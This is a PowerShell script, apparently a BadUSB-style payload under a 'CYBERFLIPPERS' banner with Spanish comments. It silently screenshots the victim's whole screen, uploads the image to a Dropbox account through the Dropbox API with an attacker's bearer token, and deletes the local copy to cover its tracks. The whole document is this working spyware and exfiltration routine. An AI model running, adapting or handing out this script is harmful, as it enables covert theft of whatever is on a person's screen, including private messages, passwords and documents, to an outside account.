########################################################################################################################
#    _______     ______  ______ _____  ______ _      _____ _____  _____  ______ _____   _____                           # 
#   / ____\ \   / /  _ \|  ____|  __ \|  ____| |    |_   _|  __ \|  __ \|  ____|  __ \ / ____|                        # 
#  | |     \ \_/ /| |_) | |__  | |__) | |__  | |      | | | |__) | |__) | |__  | |__) | (___                          # 
#  | |      \   / |  _ <|  __| |  _  /|  __| | |      | | |  ___/|  ___/|  __| |  _  / \___ \                         # 
#  | |____   | |  | |_) | |____| | \ \| |    | |____ _| |_| |    | |    | |____| | \ \ ____) |                        # 
#   \_____|  |_|  |____/|______|_|  \_\_|    |______|_____|_|    |_|    |______|_|  \_\_____/                          # 
 #########################################################################################################################           

$db = ""  # Token de autorización para Dropbox

# Función para subir un archivo a Dropbox
function DropBox-Upload {
    param (
        [string]$SourceFilePath
    )
    
    try {
        $outputFile = Split-Path $SourceFilePath -leaf
        $TargetFilePath = "/$outputFile"
        $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
        $authorization = "Bearer " + $db
        $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
        $headers.Add("Authorization", $authorization)
        $headers.Add("Dropbox-API-Arg", $arg)
        $headers.Add("Content-Type", 'application/octet-stream')
        
        # Realizar la solicitud para subir el archivo
        $response = Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
        
        # Mostrar información de la respuesta
        Write-Output "Archivo '$outputFile' subido correctamente a Dropbox."
        Write-Output "Respuesta de Dropbox: $($response | ConvertTo-Json)"
    }
    catch {
        Write-Output "Error al subir el archivo a Dropbox: $_"
    }
}

# Cargar System.Windows.Forms y tomar una captura de pantalla
Add-Type -AssemblyName System.Windows.Forms
$screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
$bitmap = New-Object Drawing.Bitmap $screen.Width, $screen.Height
$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
$graphics.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $screen.Size)

# Guardar la captura de pantalla en un archivo temporal
$filePath = "$env:temp\sc.png"
$bitmap.Save($filePath, [System.Drawing.Imaging.ImageFormat]::Png)
$graphics.Dispose()
$bitmap.Dispose()

# Subir la captura de pantalla a Dropbox
DropBox-Upload -SourceFilePath $filePath

# Eliminar el archivo temporal
Remove-Item -Path $filePath -ErrorAction SilentlyContinue
